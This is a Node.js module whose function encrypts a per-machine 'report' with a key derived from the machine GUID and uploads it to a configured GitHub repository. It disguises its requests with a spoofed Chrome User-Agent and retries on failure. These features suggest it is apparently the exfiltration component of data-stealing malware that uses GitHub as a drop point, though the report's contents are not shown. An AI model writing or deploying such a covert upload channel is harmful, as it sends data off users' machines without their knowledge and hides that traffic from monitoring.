const logger = require("../utils/logger");
const { NetworkError } = require("../utils/errors");
const { encryptAes } = require("../utils/crypto");
const { getMachineGuid } = require("../system/machineId");
const config = require("./config");

const MAX_RETRIES = 3;
const TIMEOUT_MS = 15000;
const FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";

async function uploadToGitHub(report, systemId) {
    const { token, owner, repo } = config.github;

    if (!token || !owner || !repo) {
        logger.warn("GitHub credentials not configured, skipping upload");
        return false;
    }

    const guid = getMachineGuid();
    const filePath = `reports/${systemId}.json`;
    const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
    const headers = {
        Authorization: `Bearer ${token}`,
        Accept: "application/vnd.github+json",
        "Content-Type": "application/json",
        "User-Agent": FAKE_UA
    };

    const plaintext = JSON.stringify(report, null, 2);
    const encrypted = encryptAes(plaintext, guid);
    const content = Buffer.from(JSON.stringify(encrypted)).toString("base64");

    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), TIMEOUT_MS);

            const existing = await fetch(apiUrl, { headers, signal: controller.signal });
            clearTimeout(timer);

            let sha = null;
            if (existing.ok) {
                let fileInfo;
                try {
                    fileInfo = await existing.json();
                } catch {
                    throw new NetworkError(apiUrl, existing.status, "Invalid JSON response");
                }
                sha = fileInfo.sha;
            }

            const body = { message: `Update report ${systemId}`, content };
            if (sha) body.sha = sha;

            const putController = new AbortController();
            const putTimer = setTimeout(() => putController.abort(), TIMEOUT_MS);

            const response = await fetch(apiUrl, {
                method: "PUT",
                headers,
                body: JSON.stringify(body),
                signal: putController.signal
            });
            clearTimeout(putTimer);

            if (!response.ok) {
                const errBody = await response.json().catch(() => ({}));
                throw new NetworkError(apiUrl, response.status, errBody.message || response.statusText);
            }

            logger.info("Report uploaded successfully");
            return true;

        } catch (err) {
            const isLast = attempt === MAX_RETRIES;
            const level = isLast ? "error" : "warn";
            const msg = `Upload attempt ${attempt}/${MAX_RETRIES} failed`;
            logger[level](`${msg}: ${err.message}`);

            if (!isLast) {
                const delay = Math.pow(2, attempt - 1) * 1000;
                await new Promise(r => setTimeout(r, delay));
            }

            if (isLast) {
                logger.error("All upload attempts exhausted");
                return false;
            }
        }
    }

    return false;
}

module.exports = { uploadToGitHub };
